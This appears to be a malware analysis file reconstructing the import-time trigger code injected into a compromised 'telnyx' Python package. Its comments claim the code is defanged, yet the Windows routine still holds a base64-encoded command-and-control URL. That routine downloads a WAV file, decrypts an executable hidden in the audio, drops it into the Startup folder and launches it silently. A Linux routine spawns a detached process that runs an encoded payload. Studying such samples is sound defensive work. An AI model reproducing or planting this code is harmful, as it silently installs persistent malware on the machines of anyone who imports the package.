# Stage 0: Trigger — injected into telnyx/_client.py
#
# This code was injected at the top and bottom of the legitimate _client.py file.
# It runs at module level on any `import telnyx` statement.
#
# The attacker added malicious imports at lines 4-10, 16 of _client.py,
# a base64 decode helper at line 41, the embedded payload blob at line 459,
# and the three functions below plus their invocations at lines 7761-7825.
#
# DEFANGED: All attacker-controlled URLs have been neutralized.

import subprocess
import tempfile
import time
import os
import base64
import sys
import wave
import urllib.request


def _d(s):
    """Base64 decode helper used to obfuscate strings throughout the trigger."""
    return base64.b64decode(s).decode('utf-8')


# Embedded Linux payload — base64-encoded Stage 1 orchestrator (~3,320 bytes decoded).
# See stage1_linux_orchestrator.py for the decoded version.
_p = "SNIPPED_FOR_DEFANGING"  # Original: ~4,400 char base64 string


def setup():
    """Windows attack path — downloads PE binary via WAV steganography, drops to Startup folder."""
    if os.name != 'nt':
        return

    try:
        # Deobfuscated: os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup', 'msbuild.exe')
        p = os.path.join(os.getenv(_d('QVBQREFUQQ==')), _d('TWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVw'), _d('bXNidWlsZC5leGU='))
        l = p + _d('LmxvY2s=')   # .lock
        t = p + _d('LnRtcA==')   # .tmp

        # Skip if already infected
        if os.path.exists(p):
            return

        # Rate limit: skip if lock file exists and is < 12 hours old
        if os.path.exists(l):
            m_time = os.path.getmtime(l)
            if (time.time() - m_time) < 43200:
                return

        # Create hidden lock file
        with open(l, 'w') as f:
            f.write(str(time.time()))

        try:
            subprocess.run(['attrib', '+h', l], capture_output=True)
        except:
            pass

        # Download hangup.wav from C2
        # DEFANGED: Original URL was http://83.142.209.203:8080/hangup.wav
        r = urllib.request.Request(_d('aHR0cDovLzgzLjE0Mi4yMDkuMjAzOjgwODAvaGFuZ3VwLndhdg=='), headers={_d('VXNlci1BZ2VudA=='): _d('TW96aWxsYS81LjA=')})
        with urllib.request.urlopen(r, timeout=15) as d:
            with open(t, "wb") as f:
                f.write(d.read())

        # WAV steganography: extract and XOR-decrypt PE binary from audio frames
        with wave.open(t, 'rb') as w:
            b = base64.b64decode(w.readframes(w.getnframes()))
            s, m = b[:8], b[8:]        # 8-byte XOR key + ciphertext
            payload = bytes([m[i] ^ s[i % len(s)] for i in range(len(m))])
            with open(p, "wb") as f:    # Write to msbuild.exe in Startup folder
                f.write(payload)

        # Clean up temp file
        if os.path.exists(t):
            os.remove(t)

        # Execute with CREATE_NO_WINDOW flag
        subprocess.Popen([p], creationflags=0x08000000)

    except:
        pass


def FetchAudio():
    """Linux attack path — spawns detached process running decoded Stage 1 orchestrator."""
    if os.name == 'nt':
        return
    try:
        subprocess.Popen(
            [sys.executable, "-c", f"import base64; exec(base64.b64decode('{_p}').decode())"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
    except:
        pass


# --- Module-level invocation (runs on `import telnyx`) ---

# v4.87.1 has Setup() [capital S] — NameError on Linux, Windows path never fires
# v4.87.2 fixes to setup() — both paths work
setup()       # Windows: download hangup.wav -> msbuild.exe in Startup
FetchAudio()  # Linux: spawn background process -> Stage 1 orchestrator
